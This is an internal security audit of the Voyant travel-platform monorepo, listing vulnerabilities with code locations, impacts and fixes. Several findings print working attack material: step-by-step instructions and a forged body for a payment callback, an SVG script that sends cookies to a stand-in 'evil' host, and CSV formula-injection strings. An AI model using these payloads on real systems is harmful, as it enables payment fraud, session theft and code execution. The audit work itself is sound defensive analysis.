# Security & Enterprise-Readiness Assessment

**Date:** 2026-06-12
**Scope:** Full Voyant monorepo at `main` (`884a34a52`) — `packages/*`, `apps/*`, `apps/operator`, plus dependency/supply-chain posture.
**Method:** Eight parallel deep-dive audits (authentication, authorization/tenancy, public attack surface & rate limiting, injection & input validation, secrets/config/headers/logging, internal service-to-service auth, plugins/webhooks/SSRF, uploads/storage/supply-chain) plus a `pnpm audit`. The headline payment-forgery finding was independently re-verified against source.
**Status:** Findings only — **no remediation has been started.**

---

## Executive summary

Voyant's core security *engineering* is strong: capability tokens, hashed API keys, uniform Zod validation, parameterized SQL, KMS-encrypted PII, and fail-closed CORS/cache are all done well, and the framework's primitives are sound. The gaps are **not** architectural rot — they are concentrated, nameable, and fixable.

However, the platform is **not enterprise-ready as it ships today**, for four concrete reasons:

1. There is **effectively no rate limiting in production** (the one middleware is unmounted and broken; Better Auth's limiter is a no-op on Workers).
2. One **unauthenticated payment-callback path yields free confirmed bookings**.
3. A **legacy API surface bypasses all actor and API-key scope checks**.
4. The enterprise *capability* layer (data-plane RBAC, MFA enforcement, audit logging, security headers) is largely absent.

The first three are vulnerabilities to fix; the fourth is a feature gap. None require rearchitecting the foundations.

### A note on SSO / identity (deliberate scoping)

Enterprise SSO is **intentionally not a primary focus** for the self-hosted framework. The expected paths are:

- **Deploy via Voyant Cloud**, which provides enterprise admin auth centrally through **WorkOS** (see `voyant-cloud/packages/db/src/schema/admin-auth.ts` and the cloud-broker assertion flow in `voyant/packages/auth/src/cloud-broker/`). The self-hosted operator already supports this through `VOYANT_ADMIN_AUTH_MODE=cloud`, which disables local Better Auth routes and trusts signed RS256 assertions from the broker.
- **Build their own enterprise auth** on top of the framework, sized to their own IdP/compliance requirements.

So SCIM/SAML/OIDC are **out of scope as framework deliverables**. Where we can make the *self-hosted* path easier without owning it (e.g. documenting the cloud-auth handoff, exposing clean hooks for a customer's own auth resolver), that's a nice-to-have, not a priority. The MFA, audit-logging, RBAC, and rate-limiting gaps below are *not* covered by the cloud handoff and remain framework responsibilities.

### Severity tally

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 8 |
| Medium | 11 |
| Low | 7 |

---

## CRITICAL

### C1 — Forged payment callback confirms bookings without payment
**`voyant-travel/plugin-netopia/src/service-callback.ts:43-130`, `voyant-travel/plugin-netopia/src/plugin.ts:209`, `apps/operator/src/api/app.ts:175-181`**

The Netopia payment callback is mounted as a fully unauthenticated public route (it is listed in the operator's `publicPaths`) and performs **no signature / HMAC / source verification**. The handler's own comment states the design assumption:

> *"we intentionally don't validate `payment.amount` / `payment.currency` against the session… The trustworthy field is `payment.status` — the orderID is the unguessable secret that ties the callback to the session, and Netopia is the only party that knows it."*

That assumption is false. `deriveNetopiaOrderId` (`service-shared.ts:77-79`) returns `session.externalReference ?? session.clientReference ?? session.id` — the payment-session TypeID. That id is **the customer's own payment-link bearer**: the public storefront journey creates the session and redirects the customer to `/pay/$sessionId` (`apps/operator/src/routes/pay_.$sessionId.tsx:14-16` — "the session id is the bearer"), and `GET /v1/public/finance/payment-sessions/:sessionId` serves it. The attacker therefore already holds the orderID for their own booking.

**Exploit (fully self-service, no staff involvement):**
1. Start a real checkout via the public journey → obtain `sessionId` from the `/pay/<sessionId>` URL.
2. Instead of paying, `POST /v1/finance/providers/netopia/callback` with `{"order":{"orderID":"<sessionId>"},"payment":{"amount":1,"currency":"RON","ntpID":"x","status":3}}`.
3. `netopiaWebhookPayloadSchema` accepts it; `mapNetopiaPaymentStatus` treats status `3`/`5` as success; the handler calls `completePaymentSession(status:"paid")`.
4. `completePaymentSession` emits `payment.completed` (`packages/finance/src/service.ts:2407-2421`); the subscriber `dispatchCheckoutFinalize` **confirms the booking and issues the final invoice**.

Amount/currency are explicitly unchecked; `ntpID` and `status` are attacker-chosen, so the `netopia:${ntpID}:${status}` idempotency key offers no protection.

**Impact:** Free confirmed bookings for any session whose id the attacker holds; also the ability to flip any reachable session to failed/processing.
**Fix:** Verify Netopia's IPN signature (Netopia v2 signs the notification) with a timing-safe compare before trusting `payment.status`; reject unsigned callbacks; reconcile against a server-initiated `getStatus` call rather than the inbound body.

### C2 — No effective rate limiting anywhere
**`packages/hono/src/middleware/rate-limit.ts:41-47`, `packages/hono/src/app.ts:239-399`, `packages/auth/src/server.ts:716-719`**

Three compounding facts:

- The shipped `rateLimit()` middleware is **never mounted** by any template or app (zero call sites outside tests).
- Even if mounted, it is **structurally broken**: the key is a global static `bucket` with no per-IP/per-subject dimension (one noisy client 429s everyone; an abuser can't be targeted), and it does a **non-atomic read-modify-write** on eventually-consistent KV (`kv.get` then `kv.put(count+1)`), so concurrent requests across PoPs all read the same stale count and massively undercount.
- Better Auth is configured with **no `rateLimit` block and no `secondaryStorage`** (`buildBetterAuth`), so it falls back to an in-memory limiter — per-isolate and ephemeral on Cloudflare Workers, i.e. effectively no protection across the fleet.

**Impact:** Unlimited credential stuffing and login brute force, 6-digit OTP brute force, password-reset/email-enumeration bombing, and unthrottled anonymous write abuse (see C3, H6, H8).
**Fix:** A distributed limiter (Cloudflare Rate Limiting binding or Durable-Object counter) keyed by `cf-connecting-ip` + route, mounted by default in `createApp` and applied to `/auth/*` and all anonymous write endpoints; configure Better Auth `rateLimit` against KV/DO secondary storage; layer Cloudflare WAF/Rate-Limiting rules at the edge.

### C3 — SMS toll fraud / email bombing via anonymous verification start
**`packages/storefront/src/verification/routes-public.ts`, `apps/operator/src/api/composition.ts`, `packages/storefront/src/verification/service.ts`**

`POST /v1/public/storefront-verification/sms/start` and `/email/start` are in `publicPaths` and, in the operator, wired to **live Voyant Cloud SMS + email providers**. The destination is attacker-supplied; there is **no rate limit, no captcha, and no resend throttle**. `startChallenge` re-sends on every call to a pending challenge — it records `lastSentAt` but never uses it to gate resends.

**Impact:** (1) SMS toll fraud / smishing — every `/sms/start` call with an arbitrary phone number sends a billable SMS, so an attacker drives unbounded spend and can SMS-bomb victims; (2) email bombing of arbitrary inboxes.
**Fix:** Per-destination and per-IP resend cooldowns (e.g. 1/30s, N/hour), a daily cap per destination, and a captcha/Turnstile gate before dispatch.

---

## HIGH

### H1 — Legacy `/v1/<module>` surface bypasses actor + API-key scope enforcement
**`packages/hono/src/app.ts:398-433`, `packages/hono/src/middleware/require-actor.ts:8,78-94`**

**Status update:** the legacy module `routes` surface and the bare `/v1/*`
catch-all actor guard have since been removed. Bare `/v1/{name}` is reserved for
explicit webhook routes; package routes should mount on `/v1/admin/*` or
`/v1/public/*`.

Actor guards are mounted on only two prefixes:
```ts
app.use("/v1/admin/*",  requireActor("staff"))
app.use("/v1/public/*", requireActor("customer", "partner", "supplier"))
```
The legacy surface is mounted with no equivalent (`if (mod.routes) app.route(\`/v1/${mod.module.name}\`, mod.routes)`). The **only** place API-key scopes are enforced is inside `requireActor`, whose resource extractor matches only `^/v1/(?:admin|public)/...`. Most modules (relationships, quotes, transactions, identity, finance, bookings, distribution, markets, sellability, resources, extras, external-refs, ground, facilities) expose their **full admin CRUD** at `/v1/<module>`, and the operator admin UI actively calls these legacy paths.

**Impact:** A `voy_` API key scoped to e.g. `products:read` is enforced on `/v1/admin/products` but can hit `/v1/products`, `/v1/relationships`, `/v1/quotes`, `/v1/finance`, etc. with **no scope check at all** — full read/write/delete across every module. Scoped API keys are effectively unenforceable. Latent second prong: any deployment resolving a non-staff session actor would reach staff CRUD here too (operator dodges this only because it forces every session to `staff`).
**Fix:** Mount an actor + scope guard on `/v1/*`, or drop the legacy mount.

### H2 — Stored XSS via uploads, reachable by any authenticated principal
**`apps/operator/src/api/media-upload-routes.ts:69-133`, `packages/hono/src/app.ts:397-399`, `lib/storage.ts:7-33`**

**Status update:** media upload and serve routes now mount only on the staff
surface (`/v1/admin/uploads`, `/v1/admin/uploads/video`, and
`/v1/admin/media/*`). The serve route also forces `nosniff`,
`Content-Disposition: attachment`, and `application/octet-stream` for scriptable
MIME types; unsafe scriptable uploads are rejected.

Historically, the upload and media serve routes sat on the unguarded legacy
surface (H1), so any valid credential — including a customer-portal session or a
`voy_` key with any scope — could upload to and read from MEDIA_BUCKET. The old
serve route derived `Content-Type` from the client-supplied filename extension.

**Exploit:** Upload `evil.svg` containing `<svg xmlns=...><script>fetch('https://evil/?c='+document.cookie)</script></svg>`; it serves inline as `image/svg+xml` from the operator Worker origin — the same origin as the SSR admin dashboard. A logged-in staff member who opens the URL executes the script in the admin session. Keys are semi-predictable (`uploads/<ms-timestamp>-<8 hex>`), so objects are also enumerable.
**Fix:** Keep these routes under `/v1/admin/*`; keep `nosniff` +
`Content-Disposition: attachment`; restrict served content types to safe values
(force `application/octet-stream` otherwise); validate extension/magic-bytes on
upload; add a global CSP.

### H3 — Template engines do not HTML-escape → stored XSS / SSRF in invoices, contracts, emails
**`packages/templating/src/template-renderer.ts:12,160,197`, `packages/notifications/src/liquid.ts:3`, `packages/finance/src/service-documents.ts:265`**

Both Liquid engines are constructed without `outputEscape`, and the Mustache fallback emits raw values. LiquidJS does not auto-escape `{{ }}` (Shopify-compatible), so every interpolated value is inserted verbatim. Customer/staff free-text (traveler names, addresses, line-item descriptions, invoice notes) reaches these renderers as data, and the rendered HTML is then:
- fed to **Cloudflare Browser Rendering** for PDF generation with `networkidle0` — a headless, network-enabled Chrome executes any injected `<script>`/`<img onerror>`, enabling SSRF / data exfiltration during render;
- stored and served as `text/html` (stored XSS against staff who preview it);
- emitted as email HTML.

The shipped authoring snippets reinforce the unsafe pattern (`{{ traveler.firstName | default: "traveler" }}` with no `| escape`).
**Fix:** Set `outputEscape: "escape"` on the Liquid engines for `html` body formats; HTML-escape in `renderMustacheTemplate`/`stringifyValue`; sanitize (e.g. `sanitize-html`, already a dep in products) before handing HTML to Browser Rendering; render the PDF path with JS disabled or a `default-src 'none'` CSP. See also dependency advisory M11 (liquidjs RCE).

### H4 — Resolved: workflow orchestrator retired

The affected self-hosted orchestrator, resume endpoint, generic run state, and
workflow dashboard were removed with the Voyant workflow product. Product jobs
now expose only fixed authenticated invocation and minimal health, and accept
neither arbitrary payloads nor caller-supplied step results.

### H5 — Resolved: checkout-collection routes require booking capability
**Current owner: `packages/finance/src/checkout-routes.ts`, `packages/finance/src/checkout-service.ts`**

This was originally reported against the retired `packages/checkout` module.
The v1 branch moved checkout collection into Finance and now gates
`/bookings/:bookingId/collection-plan` and `/initiate-collection` with
`requireCheckoutCapability(...)`, falling back to guest booking access only when
that access is explicitly present.

**Residual check:** Keep this covered by route tests whenever Finance checkout
public paths change.

### H6 — Unbounded anonymous row creation (CRM intake + outbox flooding)
**`packages/storefront/src/service-intake.ts:101,160-225`, `packages/storefront/src/routes-public.ts:269-299`**

`POST /v1/public/leads` / `newsletter` creates a `crm.person` + `customer_signal` per request; dedup is only by a client-supplied `sourceSubmissionId`, so omitting it inserts new rows on every call. The operator wires no intake guard (only a comment that hosts "can wire captcha").

**Impact:** Anonymous, free DB flooding produces junk persons/signals, storage
cost, and CRM degradation. Newsletter double-opt-in additionally emails
arbitrary addresses.
**Fix:** Wire captcha + per-IP rate limiting on intake and enforce server-side
dedup independent of client-supplied ids.

### H7 — Session tokens and OTPs leak into logs
**`packages/hono/src/middleware/error-boundary.ts:21,41-57`, `packages/finance/src/routes-public.ts:238-340`, `apps/operator/src/api/auth/handler.ts:234,247`**

`handleApiError` (wired as `app.onError`, runs on every thrown error including routine 401/403/422) logs all request headers with a denylist of only `authorization` and `x-api-key`. It therefore logs **`cookie` (the Better Auth session token) and `x-voyant-checkout-capability` in plaintext**, landing in Workers Logs where anyone with dashboard access can replay sessions. Additionally: accountant share routes use the bearer token as a URL path segment (`/accountant/:token/...`), which the default logger emits on every request; and OTPs and password-reset URLs are `console.info`'d whenever `VOYANT_API_KEY` is absent — a dev fallback selected purely by a missing env var, so a misconfigured prod deploy fails open into logs.

**Impact:** Session/capability replay and account takeover from log access; live OTP/reset disclosure on misconfiguration.
**Fix:** Switch the error-boundary to a header **allowlist**; redact the `:token` path segment (log `routePath`, not `path`); gate the OTP/reset console fallback on an explicit dev flag and fail loudly otherwise.

### H8 — Secrets committed to git history; one set is in the public repo
**Historical commits (verified retrievable)**

`apps/dev/.dev.vars` was tracked and its adding commit `ccc4a5f50` is an ancestor of `main` (pushed to the public `github.com/voyant-travel/voyant`). `git show ccc4a5f50:apps/dev/.dev.vars` returns `BETTER_AUTH_SECRET`, `SESSION_CLAIMS_SECRET`, `INTERNAL_API_KEY`, and `KMS_LOCAL_KEY`. The 2026-06-11 cleanup commit removed the file but did **not** rewrite history, so the values remain publicly retrievable. A local `develop` branch (not on the public remote) additionally contains a real **Twilio auth token + SID** and a **Cloudflare Stream API token + account id**.

**Impact:** Public-history values must be treated as permanently compromised; if any (`KMS_LOCAL_KEY`/`INTERNAL_API_KEY` especially) were ever reused in a deployed environment, that environment is exposed.
**Fix:** Rotate all of the above now (Twilio + CF Stream tokens first); add a gitleaks/trufflehog CI workflow to prevent recurrence; consider `git filter-repo` only if rotation is impossible.

---

## MEDIUM

### M1 — `INTERNAL_API_KEY` is an unscoped, non-rotatable, non-constant-time god credential
**`packages/hono/src/middleware/auth.ts:124-131`**
`token === internalKey` (not timing-safe) sets `isInternalRequest: true`, which short-circuits both `requireActor` and `requirePermission` — total authorization bypass across every route. It is a single static env secret with no scoping, versioning, or rotation, and no in-repo caller sends it. **Fix:** constant-time compare; scope internal callers to specific resources/actions; accept a rotatable list.

### M2 — CORS credentialed-origin reflection footguns
**`packages/hono/src/middleware/cors.ts:51,57-61,80-100`**
Every allowed origin is reflected with `Access-Control-Allow-Credentials: true`. A bare `*` allowlist entry compiles to credentialed allow-all; any entry whose string merely *contains* "localhost" unlocks all `localhost`/`127.0.0.1`/`[::1]` origins on any port in production; `Access-Control-Allow-Headers` is reflected verbatim. **Fix:** reject bare `*` when credentials are on; require exact `http://localhost:<port>` matches instead of substring; document wildcard semantics. (Note: CORS otherwise fails closed on an empty allowlist — see strengths.)

### M3 — No security headers anywhere
**Repo-wide (verified absent)**
No HSTS, `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, CSP, or `Referrer-Policy` are set by any middleware, and there is no `_headers` file. The SSR admin dashboard is therefore **frameable by any site (clickjacking)**, has no CSP to constrain any admin-side XSS, and serves API JSON without `nosniff`. **Fix:** add a security-headers middleware to `createApp` defaults (nosniff + Referrer-Policy on API; XFO/frame-ancestors + CSP + HSTS on the SSR path).

### M4 — MCP mutating tools callable by any actor
**`apps/operator/src/api/mcp.ts:31-64`**
Historical note: the v1 package-structure branch retires the public catalog MCP
surface and keeps only app-local admin trips tools. Catalog-capable
agents should call catalog HTTP APIs directly. If any runtime reintroduces
public tool wrappers, it must preserve the same API auth, visibility,
rate-limit, audit, and tenant controls.

### M5 — Cross-user idempotency replay can leak a session/capability token
**`packages/hono/src/middleware/idempotency-key.ts:124,151-174`**
Records are keyed by `(scope, key)` where `scope` defaults to `${method} ${pathname}` with **no actor/session/IP component** and the key is client-chosen. On the anonymous bootstrap route, two callers using the same key with a colliding body hash cause the second to receive the first's stored JSON verbatim — which includes `data.session.checkoutCapability.token`. **Impact (UNVERIFIED exploitability — requires same key + identical body):** session/capability takeover for popular departures with default pax. **Fix:** namespace the idempotency scope with actor/session/IP on unauthenticated surfaces; never replay responses carrying session-bound secrets.

### M6 — No request body / upload size limits
**`packages/hono/src/validation.ts:75-89`, `apps/operator/src/api/media-upload-routes.ts:84`**

**Status update:** the app now has a global body limit and the media upload route
has explicit content-length/file-size limits. The remaining risk in this finding
is unbounded/deep JSON parsing work before schema validation.

`parseJsonBody` does `c.req.json()` with no depth/CPU guard; the idempotency
middleware buffers and re-buffers the full body. **Impact:** large/deep JSON can
still create CPU pressure during Zod validation. **Fix:** keep Hono `bodyLimit`
mounted globally and add depth/complexity protection for JSON parsing.

### M7 — One secret reused across three crypto contexts + arbitrary-user token minting
**`apps/operator/src/api/auth/handler.ts:148,219,227`, `packages/hono/src/middleware/auth.ts:258-269`, `packages/auth/src/backend.ts:26-28`**
**Mitigated:** admin and customer session claims now require independent realm-specific roots, and `requireAuth` selects exactly one key from the normalized route surface. Cloud-admin state cookies derive an additional HKDF context key internally, while checkout and guest capabilities use their own explicit capability secrets. Tokens from one realm or capability cannot be replayed into another.

### M8 — Build-phase placeholder secret can become a live signing key
**`packages/auth/src/server.ts:104-119`**
`getAuthSecret()` returns the constant `"build-phase-placeholder-secret-not-used-at-runtime!!"` whenever `process.env.NEXT_PHASE` is set — a generic Next.js env var easily leaked via a shared `.env`. Anything signing/verifying with it becomes forgeable. **Fix:** never return a usable secret; gate on a build-only flag that cannot exist at runtime, or fail loudly.

### M9 — Supply-chain: publish not gated by tests; floating action tags; no automated dep management
**`.github/workflows/release.yml`, repo root**
The `release` job runs build + export/tarball verification then `pnpm release`, but **never runs tests/lint/typecheck** (CI runs in parallel and does not gate publishing). All third-party actions float on major tags in a job holding `id-token: write` + `contents: write`. No Renovate/Dependabot. `pnpm audit`: 4 critical / 21 high / 37 moderate / 5 low (mostly dev-only, but see M11). **Fix:** make publish `needs:` the CI/test job; pin actions to commit SHAs; add Renovate + a `pnpm audit` triage gate; enable `npm publish --provenance`.

### M10 — Vulnerable runtime dependencies (liquidjs RCE, axios HIGHs)
**`packages/notifications/package.json`, `apps/operator` → typesense → axios**
`liquidjs@10.25.5` (runtime, used for email templates) carries a CRITICAL "Remote Code Execution" advisory (fixed ≥10.26.0) plus ReDoS advisories — reachable if any user/partner-influenced data is rendered (see H3). `typesense@^3.0.6` pulls `axios@1.15.2` with HIGH advisories (proxy-auth credential leak, prototype-pollution MitM, ReDoS); the root override `axios: ">=1.15.0"` is too loose and resolved the vulnerable version. **Fix:** bump liquidjs to ≥10.26.0; tighten the axios override to `">=1.16.0"`.

---

## LOW

### L1 — Session/membership revocation latency
**`packages/auth/src/server.ts:608-620`, `packages/auth/src/cloud-admin-session.ts:74,194-196`**
Session cookie cache defaults on with a 5-min TTL; cloud-mode membership re-checks only after 15 min. Combined worst-case revocation lag ~5–15 min. **Fix:** for revocation-sensitive tenants, set `sessionCookieCache: false` and a shorter revalidate window; document the tradeoff.

### L2 — Cloud mirror links accounts by email and trusts asserted `emailVerified`
**`packages/auth/src/cloud-admin-session.ts:288,384-425`**
`findCloudMirrorUser` falls back to matching a local user by email and writes `emailVerified` from the assertion. Safe only while the broker guarantees verified, non-reusable emails per org. **Fix:** link by stable provider account id, or require `emailVerified === true` before email-based linking.

### L3 — Guest booking overview has no rate limit; secure-cookie flag is env-fragile
**`packages/bookings/src/routes-public.ts:362-385`, `packages/auth/src/server.ts:717`**
`GET /overview?bookingId&email` is unthrottled when no rate-limit provider is injected — an attacker who knows a victim email can brute-force booking numbers to enumerate financials (email compare is constant-time, which helps). **Fix:** rate-limit `/overview`; require the deployment rate-limit provider; derive `Secure` from request scheme.

### L4 — CSV export does not neutralize formula-injection prefixes
**`packages/relationships/src/service/accounts-people.ts:494`**
Delimiter/CRLF quoting is correct, but values beginning with `= + - @ \t \r` are exported verbatim. A person named `=HYPERLINK(...)` or `=cmd|'/c calc'!A1` executes when an operator opens the export in Excel/Sheets. **Fix:** prefix such cells with a single quote before quoting; add a shared `toCsvCell` helper in `@voyant-travel/utils`.

### L5 — `<500` thrown errors reflect raw messages/details to clients
**`packages/hono/src/middleware/error-boundary.ts:29-38`**
Anything thrown with a numeric `status < 500` (including third-party errors carrying one) has its `.message`/`.details` reflected verbatim; `apps/operator/src/api/app.ts:241-243` returns raw `err.message` in a 500 for `rebuild-tax-lines` (staff-only). ≥500 is correctly generic. **Fix:** only surface messages from the framework's own `ApiError` types.

### L6 — `generateLinkTableSql` builds DDL via unescaped identifier interpolation
**`packages/core/src/links.ts:196`, `packages/db/src/links.ts:323`**
DDL identifiers (`tableName`/`leftColumn`/`rightColumn`) are string-interpolated without escaping. Risk is low — values come from developer-authored `defineLink()` specs at build time, never from HTTP input, and the runtime read/write path correctly uses `sql.identifier(...)` + bound params. **Fix (defense-in-depth):** route DDL identifiers through a `"${x.replaceAll('"','""')}"` helper.

### L7 — Storage/serve hardening gaps
**`packages/storage/src/providers/r2.ts:92-98`, `apps/operator/src/api/contract-document-routes.ts:64-87`, `media-upload-routes.ts:97,111`**
R2 `signedUrl` returns a permanent unsigned URL when only `publicBaseUrl` is set (`expiresIn` ignored). The staff document serve route renders inline without `nosniff`. The video-upload route parses the body via a TypeScript cast with no Zod validation. The media serve route reads an unconstrained object key from the URL (not a traversal vuln given flat key namespaces, but it serves any bucket key with no prefix allowlist). **Fix:** document the signedUrl contract or refuse to "sign" without a signer; `nosniff` + `attachment` on document serve; add Zod to the video route; validate the media key prefix.

---

## What is already strong (preserve and market)

- **Capability-token design** (`packages/hono/src/public-capability.ts`): HMAC-SHA256, constant-time compare, subject+scope+action+expiry binding, ≥32-char secret enforced (fails closed). Booking-session routes use it consistently — no IDOR despite no userId binding.
- **Public document delivery** (`packages/hono/src/public-document-delivery.ts`): the gold standard in the repo — 256-bit opaque tokens, SHA-256-hashed at rest, TTL caps (24h default / 30d max), revocation, `Content-Disposition: attachment`, content-type allowlist, `Cache-Control: private`, per-access audit.
- **Customer-portal ownership** is enforced server-side from the session `userId`, never from client params (`resolveLinkedCustomerRecordId` + `personId` checks on every booking/document/companion access).
- **Injection posture is excellent:** zero raw `c.req.json()` in first-party packages (all through `parseJsonBody` + Zod), all dynamic SQL allowlisted or parameterized (`sql.identifier()` + bound params; switch-case sort columns), no `eval`/`exec`/`Function` sinks, no prototype-pollution surface, no `.passthrough()` on request schemas.
- **Credential hygiene at rest:** API keys SHA-256-hashed (only a 6-char prefix retained), passport *numbers* KMS-encrypted with action-ledger-audited reveals (no passport scans stored), no plaintext secrets in any wrangler config, no DB-plaintext third-party credentials, no postinstall hooks, OIDC-based npm publishing, lockfile + `packageManager` pinned.
- **Cloud-broker assertion verification** (`packages/auth/src/cloud-broker/`): RS256 pinned, `alg:none` rejected, JWKS `kid` lookup, full claim validation (iss/aud/deploymentId/nonce/exp/iat), CSRF- and open-redirect-hardened state cookies. This is the enterprise SSO path (via Voyant Cloud + WorkOS).
- **Fail-closed defaults** where they exist: `requireActor` returns 401 on unset actor (old "default to staff" footgun removed), CORS denies on empty allowlist, the public cache stores only explicitly-marked `public` 200s and never anything with `Set-Cookie`, agent control-plane/runner return 503 when auth is unconfigured.
- **Outbound integration hygiene:** TLS verification never disabled; all plugin clients use `resilientFetch` (timeouts + circuit breakers); payment-initiating POSTs never retry; outbound URLs are env/enum-sourced (no SSRF sink); channel-push logging redacts auth headers + PII.
- **Service-to-service:** tenant step dispatch is HMAC-authenticated (`X-Voyant-Dispatch-Auth` via Web Crypto); Durable Objects are reachable only via service bindings, not public HTTP.

---

## Enterprise capability gaps (features, not bugs)

These are what a security questionnaire / procurement review will flag, independent of the vulnerabilities above. SSO/SCIM are deliberately excluded per the scoping note (covered by Voyant Cloud + WorkOS, or by the customer's own build).

| Capability | Status | Owner |
|---|---|---|
| **Distributed rate limiting** (per-IP/route/token, edge-enforced) | Absent (C2) | Framework |
| **MFA / 2FA** (TOTP/WebAuthn, enforcement policy, step-up) | Absent — no Better Auth `twoFactor` plugin | Framework |
| **Data-plane RBAC** (roles beyond the 4 actor strings; refund-issuer vs read-only; SoD) | Absent — every staff session gets `scopes:["*"]`; `requirePermission` is dead code (zero call sites) | Framework |
| **Security audit logging** (sign-ins, failed attempts, token issuance/rotation, admin mutations, PII reveals) | Absent — `auditLog` is declared in permissions but nothing emits it | Framework |
| **Security headers defaults** (CSP/HSTS/XFO/nosniff/Referrer-Policy) | Absent (M3) | Framework |
| **Bot protection** (captcha/Turnstile hooks on anonymous endpoints) | Absent — only a code comment | Framework |
| **Webhook signature framework** (verify inbound, sign outbound; timing-safe + replay window) | Absent — root cause of C1 | Framework |
| **Secret rotation** (dual-secret grace windows for auth/session/internal/dispatch secrets) | Absent | Framework |
| **Request/upload payload limits** (global `bodyLimit`, per-route caps) | Absent (M6) | Framework |
| **Upload safety** (AV scanning hooks, magic-byte/MIME allowlist, content sanitization) | Absent (H2) | Framework |
| **Configurable password policy** (complexity, breached-password/HIBP check, history) + account lockout | Minimal — only min-8/max-128 | Framework |
| **Egress allowlisting** for operator-configurable URLs (CMS/embedding base URLs, notify/redirect URLs) | Absent | Framework |
| **Supply-chain controls** (Renovate/Dependabot, `pnpm audit` CI gate, SHA-pinned actions, SBOM, publish provenance, secret scanning) | Absent (M10, H8) | Framework |
| **Self-host SSO ergonomics** (clean auth-resolver hooks, documented cloud-auth handoff) | Partial — works via `VOYANT_ADMIN_AUTH_MODE=cloud`; under-documented | Nice-to-have |

---

## Recommended remediation order

**Immediate (days) — stop active exploitation and stop the bleeding:**
- Rotate the leaked secrets (H8); Twilio + Cloudflare Stream tokens first.
- Verify Netopia callback signatures (C1).
- Bump liquidjs ≥10.26.0 and tighten the axios override (M11).
- Add `cookie` to log redaction / switch the error-boundary to an allowlist (H7).
- Throttle + captcha the verification-start endpoints (C3).

**Sprint 1–2 — close the structural holes:**
- Distributed (DO/CF-binding) rate limiting mounted by default in `createApp`, plus Better Auth secondary-storage rate limiting (C2).
- Apply actor + scope guards to the legacy `/v1/*` surface or remove it (H1).
- Staff-gate uploads + `nosniff`/`Content-Disposition`/content-type allowlist + a global CSP and security-headers middleware (H2, M3).
- Liquid `outputEscape` + sanitize before Browser Rendering (H3).
- Capability-gate checkout-collection routes (H5); intake guards + server-side dedup (H6).

**Quarter — enterprise capability layer:**
- Data-plane RBAC (wire `requirePermission`, replace `scopes:["*"]`); structured security audit logging.
- MFA plugin + enforcement policy.
- Inbound/outbound webhook signature framework.
- Global body limits; secret-rotation support (dual-secret grace).
- Renovate/Dependabot + `pnpm audit` and test gates on publish; SHA-pin actions; secret scanning in CI; SBOM + publish provenance.
- Document the Voyant Cloud + WorkOS SSO handoff and expose clean self-host auth-resolver hooks (nice-to-have).
